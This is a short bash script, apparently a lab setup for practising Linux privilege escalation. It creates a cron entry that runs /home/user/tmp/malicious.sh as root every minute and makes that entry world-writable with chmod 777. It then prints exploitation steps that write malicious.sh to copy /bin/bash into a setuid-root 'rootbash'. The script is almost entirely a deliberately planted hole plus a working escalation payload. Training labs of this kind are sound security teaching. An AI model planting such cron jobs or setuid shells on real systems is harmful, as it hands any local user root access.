#!/bin/bash
# Création d'une tâche cron modifiable

mkdir -p /home/user/etc/cron.d/
echo "* * * * * root /home/user/tmp/malicious.sh" > /home/user/etc/cron.d/vuln_cron
chmod 777 /home/user/etc/cron.d/vuln_cron

echo "✅ Cron vulnérable. Exploitation :
echo '#!/bin/bash' > /home/user/tmp/malicious.sh
echo 'cp /bin/bash /home/user/tmp/rootbash && chmod 4755 /home/user/tmp/rootbash' >> /home/user/tmp/malicious.sh
chmod +x /home/user/tmp/malicious.sh"
